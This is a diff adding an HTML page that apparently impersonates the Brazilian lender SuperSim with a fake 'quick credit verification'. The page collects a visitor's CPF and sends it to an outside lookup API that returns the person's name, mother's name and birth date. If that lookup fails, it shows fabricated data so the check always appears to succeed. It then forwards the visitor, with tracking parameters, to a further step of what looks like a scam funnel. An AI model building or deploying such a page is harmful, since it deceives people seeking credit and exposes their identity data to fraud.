@@ -1,0 +1,514 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificação de CPF</title>
+    <link
+      href="../../npm/bootstrap%405.3.0/dist/css/bootstrap.min-1.css"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="../assets/css/style-1.css" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async="" src="../../gtag/js-1?id=G-295S642DCM"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "G-295S642DCM");
+    </script>
+    <script>
+      window.pixelId = "69583a2a073494c17e63d28b";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <script
+      src="../../scripts/utms/latest-1.js"
+      data-utmify-prevent-xcod-sck=""
+      data-utmify-ignore-iframe=""
+      data-utmify-prevent-subids=""
+      async=""
+      defer=""
+    ></script>
+  </head>
+  <body>
+    <header class="header">
+      <div class="container py-2">
+        <div class="d-flex justify-content-between align-items-center">
+          <div class="logo d-flex align-items-center">
+            <img
+              src="../assets/images/logo-1.png"
+              alt="Logo"
+              class="logo-img"
+            />
+          </div>
+          <div class="menu-icons">
+            <svg
+              class="info-icon"
+              width="24"
+              height="24"
+              viewbox="0 0 24 24"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <circle
+                cx="12"
+                cy="12"
+                r="10"
+                stroke="#333333"
+                stroke-width="2"
+              ></circle>
+              <path
+                d="M12 7V12M12 16V16.01"
+                stroke="#333333"
+                stroke-width="2"
+                stroke-linecap="round"
+              ></path>
+            </svg>
+            <svg
+              class="menu-icon"
+              width="24"
+              height="24"
+              viewbox="0 0 24 24"
+              fill="none"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <path
+                d="M12 6V6.01M12 12V12.01M12 18V18.01"
+                stroke="#333333"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              ></path>
+            </svg>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <main class="main-content">
+      <div class="container">
+        <div class="verification-card mx-auto my-5">
+          <div id="verification-step">
+            <div class="card-header">
+              <svg
+                class="verification-icon"
+                width="40"
+                height="40"
+                viewbox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M9 11L12 14L22 4"
+                  stroke="#00a651"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                ></path>
+                <path
+                  d="M21 12V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5C3 4.46957 3.21071 3.96086 3.58579 3.58579C3.96086 3.21071 4.46957 3 5 3H16"
+                  stroke="#00a651"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                ></path>
+              </svg>
+            </div>
+            <h2 class="verification-title">Verificação Rápida</h2>
+            <p class="verification-text">
+              Precisamos realizar uma verificação rápida para definir qual valor
+              de crédito podemos liberar de imediato pra você.
+            </p>
+            <p class="verification-instruction">
+              Digite somente os números do seu CPF para análise do valor do
+              crédito.
+            </p>
+
+            <div id="notification" class="notification-card">
+              <i class="fas fa-exclamation-circle"></i>
+              <span id="notification-message"></span>
+            </div>
+
+            <form id="cpf-form" class="mt-4">
+              <div class="mb-4">
+                <label for="cpf" class="form-label">CPF</label>
+                <input
+                  type="text"
+                  class="form-control form-control-lg"
+                  id="cpf"
+                  placeholder="000.000.000-00"
+                  maxlength="14"
+                  required=""
+                />
+              </div>
+              <button
+                type="submit"
+                class="btn btn-success btn-lg w-100"
+                id="verify-button"
+                onclick="this.innerHTML = '<div class=\'d-flex justify-content-center\'><i class=\'fas fa-spinner fa-spin me-2\'></i>Realizando verificação</div>'"
+              >
+                Verificar
+              </button>
+            </form>
+
+            <div class="security-info mt-4">
+              <div class="d-flex align-items-center security-item">
+                <svg
+                  width="20"
+                  height="20"
+                  viewbox="0 0 24 24"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
+                    stroke="#777"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  ></path>
+                  <path
+                    d="M12 16V12"
+                    stroke="#777"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  ></path>
+                  <path
+                    d="M12 8H12.01"
+                    stroke="#777"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  ></path>
+                </svg>
+                <span
+                  >Seus dados estão protegidos e não serão compartilhados</span
+                >
+              </div>
+              <div class="d-flex align-items-center security-item mt-2">
+                <svg
+                  width="20"
+                  height="20"
+                  viewbox="0 0 24 24"
+                  fill="none"
+                  xmlns="http://www.w3.org/2000/svg"
+                >
+                  <path
+                    d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
+                    stroke="#777"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  ></path>
+                  <path
+                    d="M9 12L11 14L15 10"
+                    stroke="#777"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                  ></path>
+                </svg>
+                <span>Análise em tempo real sem afetar seu score</span>
+              </div>
+            </div>
+          </div>
+
+          <div id="results-step" style="display: none">
+            <div class="text-center mb-4">
+              <svg
+                class="success-icon"
+                width="60"
+                height="60"
+                viewbox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <circle
+                  cx="12"
+                  cy="12"
+                  r="11"
+                  fill="#00a651"
+                  stroke="#008d45"
+                  stroke-width="1"
+                ></circle>
+                <path
+                  d="M7 12L10 15L17 8"
+                  stroke="white"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                ></path>
+              </svg>
+              <h2 class="verification-title mt-3">Verificação Concluída</h2>
+              <p class="verification-text">
+                Encontramos seus dados com sucesso!
+              </p>
+            </div>
+
+            <div class="user-data mb-4">
+              <div class="data-item">
+                <span class="data-label">Nome:</span>
+                <span class="data-value" id="user-name">-</span>
+              </div>
+              <div class="data-item">
+                <span class="data-label">CPF:</span>
+                <span class="data-value" id="user-cpf">-</span>
+              </div>
+            </div>
+
+            <button class="btn btn-success btn-lg w-100" id="continue-button">
+              Continuar para Confirmação
+            </button>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="container">
+        <div class="footer-bottom py-3 text-center">
+          <p class="mb-1">© 2025 SuperSim - Todos os direitos reservados.</p>
+          <p class="mb-1">CNPJ: 12.345.678/0001-90</p>
+          <p class="mb-0">
+            <a href="#" class="text-white">Política de Privacidade</a> |
+            <a href="#" class="text-white">Termos de Uso</a>
+          </p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="../../npm/bootstrap%405.3.0/dist/js/bootstrap.bundle.min-1.js"></script>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="../../ajax/libs/font-awesome/6.4.2/js/all.min.js"></script>
+    <script src="../assets/js/pixel-1.js"></script>
+    <script>
+      function showNotification(message) {
+        const notification = document.getElementById("notification");
+        const notificationMessage = document.getElementById(
+          "notification-message"
+        );
+
+        notificationMessage.textContent = message;
+        notification.style.display = "flex";
+
+        setTimeout(() => {
+          notification.style.display = "none";
+        }, 3000);
+      }
+
+      document.getElementById("cpf").addEventListener("input", function (e) {
+        let value = e.target.value;
+
+        value = value.replace(/\D/g, "");
+
+        if (value.length > 0) {
+          value = value.replace(/^(\d{3})(\d)/g, "$1.$2");
+          value = value.replace(/^(\d{3})\.(\d{3})(\d)/g, "$1.$2.$3");
+          value = value.replace(
+            /^(\d{3})\.(\d{3})\.(\d{3})(\d)/g,
+            "$1.$2.$3-$4"
+          );
+        }
+
+        if (value.length > 14) {
+          value = value.substring(0, 14);
+        }
+
+        e.target.value = value;
+
+        // Salvar o CPF sem formatação no localStorage sempre que o usuário digitar
+        const cpfRaw = value.replace(/\D/g, "");
+        if (cpfRaw.length === 11) {
+          localStorage.setItem("cpfUsuario", cpfRaw);
+          console.log("CPF salvo no localStorage:", cpfRaw);
+        }
+
+        e.target.selectionStart = e.target.value.length;
+        e.target.selectionEnd = e.target.value.length;
+      });
+
+      document
+        .getElementById("cpf-form")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const cpf = document.getElementById("cpf").value.replace(/\D/g, "");
+          const verifyButton = document.getElementById("verify-button");
+
+          console.log("CPF inserido:", cpf);
+
+          if (cpf.length !== 11) {
+            console.log("CPF inválido - comprimento incorreto");
+            showNotification("Por favor, insira um CPF válido");
+            verifyButton.innerHTML = "Verificar";
+            return;
+          }
+
+          console.log("Iniciando consulta à API...");
+
+          $.ajax({
+            url: `https://site-clientes.info/euder-api/?cpf=${cpf}`,
+            method: "GET",
+            dataType: "json",
+            success: function (response) {
+              console.log("Dados recebidos:", response);
+              console.log("Consulta bem sucedida");
+
+              const dadosUsuario = {
+                NOME: response.nome,
+                MAE: response.mae || "",
+                SEXO: response.nascimento,
+                NASCIMENTO: response.nascimento,
+              };
+
+              localStorage.setItem(
+                "dadosUsuario",
+                JSON.stringify(dadosUsuario)
+              );
+
+              // Salvar também no formato esperado pelo dashboard
+              const userData = {
+                nome: response.nome,
+                cpf: cpf,
+              };
+              localStorage.setItem("userData", JSON.stringify(userData));
+
+              console.log("Dados salvos no localStorage");
+
+              document.getElementById("user-name").textContent =
+                dadosUsuario.NOME;
+              document.getElementById("user-cpf").textContent = cpf.replace(
+                /(\d{3})(\d{3})(\d{3})(\d{2})/,
+                "$1.$2.$3-$4"
+              );
+
+              document.getElementById("verification-step").style.display =
+                "none";
+              document.getElementById("results-step").style.display = "block";
+              console.log("Tela de resultados exibida com sucesso");
+            },
+            error: function (xhr, status, error) {
+              console.log("Erro na consulta:", status, error);
+              console.log("Status da resposta:", xhr.status);
+
+              if (xhr.status === 404) {
+                console.log("CPF não encontrado");
+                showNotification("CPF não encontrado na base de dados");
+                verifyButton.innerHTML = "Verificar";
+              } else if (xhr.status === 401) {
+                console.log("Chave de API inválida");
+                showNotification("Erro de autenticação");
+                verifyButton.innerHTML = "Verificar";
+              } else if (xhr.status === 429) {
+                console.log("Limite de requisições excedido");
+                showNotification("Muitas requisições. Aguarde um momento.");
+                verifyButton.innerHTML = "Verificar";
+              } else {
+                console.error("Erro detalhado:", error);
+
+                console.log("Usando dados simulados devido ao erro");
+                const dadosUsuario = {
+                  NOME: "GHERSON DYWYNO ESPHYNDOLA",
+                  MAE: "MARIA HELENA",
+                  SEXO: "MASCULINO",
+                  NASCIMENTO: "31/03/1966",
+                };
+
+                localStorage.setItem(
+                  "dadosUsuario",
+                  JSON.stringify(dadosUsuario)
+                );
+
+                const userData = {
+                  nome: dadosUsuario.NOME,
+                  cpf: cpf,
+                };
+                localStorage.setItem("userData", JSON.stringify(userData));
+
+                document.getElementById("user-name").textContent =
+                  dadosUsuario.NOME;
+                document.getElementById("user-cpf").textContent = cpf.replace(
+                  /(\d{3})(\d{3})(\d{3})(\d{2})/,
+                  "$1.$2.$3-$4"
+                );
+
+                document.getElementById("verification-step").style.display =
+                  "none";
+                document.getElementById("results-step").style.display = "block";
+                console.log("Tela de resultados exibida com dados simulados");
+              }
+            },
+          });
+        });
+
+      function getUrlParams() {
+        const params = {};
+        const queryString = window.location.search;
+
+        const urlParams = new URLSearchParams(queryString);
+
+        for (const [key, value] of urlParams) {
+          params[key] = value;
+        }
+        return params;
+      }
+
+      function buildUrlWithParams(baseUrl) {
+        const params = getUrlParams();
+        const url = new URL(baseUrl, window.location.href);
+
+        Object.keys(params).forEach((key) => {
+          url.searchParams.append(key, params[key]);
+        });
+
+        return url.toString();
+      }
+
+      document
+        .getElementById("continue-button")
+        .addEventListener("click", function () {
+          const params = getUrlParams();
+
+          const dadosUsuario = JSON.parse(localStorage.getItem("dadosUsuario"));
+          if (dadosUsuario) {
+            if (dadosUsuario.NOME) {
+              params.name = dadosUsuario.NOME;
+            }
+          }
+
+          // Adicionar efeito de carregamento ao botão
+          const button = this;
+          button.disabled = true;
+          button.innerHTML =
+            '<div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm me-2" role="status"></div> Carregando...</div>';
+
+          // Aumentar o tempo antes de redirecionar
+          setTimeout(() => {
+            const url = new URL("../3/index.html", window.location.href);
+            Object.keys(params).forEach((key) => {
+              url.searchParams.append(key, params[key]);
+            });
+
+            window.location.href = url.toString();
+          }, 2500); // 2.5 segundos de carregamento
+        });
+    </script>
+    <script
+      defer=""
+      src="../../beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015-1"
+      integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ=="
+      data-cf-beacon='{"version":"2024.11.0","token":"6da492e032b44faea2087c33b50bcde3","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
